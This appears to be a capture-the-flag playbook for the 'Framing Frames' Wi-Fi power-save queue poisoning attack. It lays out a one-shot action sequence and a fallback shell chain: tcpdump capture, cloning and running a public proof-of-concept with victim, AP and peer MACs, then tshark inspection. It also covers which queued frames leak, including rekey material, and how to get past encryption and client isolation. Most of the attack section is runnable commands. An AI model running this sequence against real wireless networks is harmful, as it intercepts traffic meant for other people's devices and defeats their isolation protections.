# Framing Frames flag — power-save queue poisoning

Vanhoef 2023. Frames destined for a sleeping victim can be poisoned
in the AP's power-save queue and later delivered to a controlled peer
when the victim wakes. The flag is what the victim was about to
receive.

## Recognition

- Target client uses 802.11 power-save (null-data frames toggling
  power-save bit). Common on battery devices — phones, tablets, IoT.
- AP has a client-isolation feature that is *supposed* to prevent
  peer-to-peer traffic. That's exactly the mitigation Framing Frames
  bypasses.

## The one-shot sequence

```python
run_sequence([
    {"action": "recon_start", "band": "2.4", "dwell_ms": 250},
    {"action": "wait", "s": 15},
    {"action": "recon_stop"},

    # 1. Force the victim into deep sleep via TIM/DTIM abuse or
    #    a spoofed TWT (Wi-Fi 6+).
    {"action": "force_client_sleep",
     "bssid": "AA:BB:CC:DD:EE:FF",
     "client": "11:22:33:44:55:66"},

    # 2. Poison the AP's power-save queue for the victim — the AP
    #    holds frames for the sleeping STA. Trigger delivery to a
    #    controlled peer instead of the victim.
    {"action": "framing_frames_poison",
     "bssid": "AA:BB:CC:DD:EE:FF",
     "victim_mac": "11:22:33:44:55:66",
     "attacker_mac": "aa:aa:aa:aa:aa:aa"},

    # 3. Capture the delivery.
    {"action": "capture_start",
     "iface": "wlan1mon",
     "channel": 6,
     "out_path": "/tmp/ff.pcapng"},

    {"action": "wait", "s": 20},
    {"action": "capture_stop"},
])
```

## MCP mapping / fallback

None of `force_client_sleep`, `framing_frames_poison`, `capture_start`,
or `capture_stop` exist in `src/`. All three primitives require a
crafted 802.11 injection — use scapy on the Pineapple over SSH, then
capture with tcpdump.

**Fallback shell chain:**

```bash
# 1. Sit on the target's channel + start capture (replaces capture_start).
sudo tcpdump -i wlan1mon -w /tmp/ff.pcapng \
    "wlan addr1 11:22:33:44:55:66 or wlan addr2 11:22:33:44:55:66" &
CAP_PID=$!

# 2. force_client_sleep + framing_frames_poison — both require scapy
#    injection of a spoofed Null-Data frame (PwrMgt=1) from the victim's
#    MAC, followed by a spoofed unicast to a controlled peer. See
#    Vanhoef's public PoC:  https://github.com/vanhoefm/framing-frames
git clone https://github.com/vanhoefm/framing-frames /tmp/ff
sudo python3 /tmp/ff/attack.py \
    --iface wlan1mon \
    --ap AA:BB:CC:DD:EE:FF \
    --victim 11:22:33:44:55:66 \
    --peer aa:aa:aa:aa:aa:aa

# 3. Stop capture and inspect.
sleep 20
sudo kill "$CAP_PID"
tshark -r /tmp/ff.pcapng -Y "wlan.da == aa:aa:aa:aa:aa:aa" -V | less
```

## The flag surface

Whatever the AP was about to hand the sleeping victim:

- **Unicast frame** with the flag in payload (an HTTP response, a DNS
  answer, a custom app payload).
- **The AP's queued action frame** — some CTF variants stash the
  flag in a 802.11k Neighbor Report Response the AP queued.
- **A GTK rekey** in some 2023-vintage implementations — the
  attacker's queue-poisoning surfaces the rekey material.

## Public PoC

Vanhoef's `framing-frames` GitHub repo ships the attack scripts and
a validator. Use those as the reference implementation.

## Failure modes

- **Client not using power-save.** Attack does not apply.
- **AP has client isolation done correctly.** Some 2023+ enterprise
  APs patched the queue-poisoning path. Recognize by testing whether
  peer-to-peer unicast is truly blocked.
- **Encrypted queue contents.** If the AP encrypts queued frames
  with per-STA keys, the poisoned delivery to your peer decrypts to
  garbage. Combine with SSID Confusion / shared-PSK if applicable.

## Cite

- attacks.json: `framing-frames-power-save-poison`.
- Vanhoef 2023 — USENIX Security.
